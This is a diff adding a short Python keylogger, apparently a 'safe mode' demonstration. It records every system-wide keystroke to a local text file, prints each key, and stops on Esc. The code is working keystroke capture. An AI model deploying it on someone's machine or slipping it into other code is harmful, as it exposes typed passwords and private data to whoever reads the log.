@@ -1,0 +1,20 @@
+import keyboard  # pip install keyboard
+
+print("Keylogger started (safe mode). Press esc to stop.")
+
+log_file = "keylog.txt"
+
+with open(log_file, "w") as file:
+    while True:
+        event = keyboard.read_event()
+
+        if event.event_type == keyboard.KEY_DOWN:
+            key = event.name
+
+            if key == "esc":
+                print("Keylogger stopped.")
+                break
+
+            file.write(key + "\n")
+            file.flush()
+            print(f"Logged: {key}")
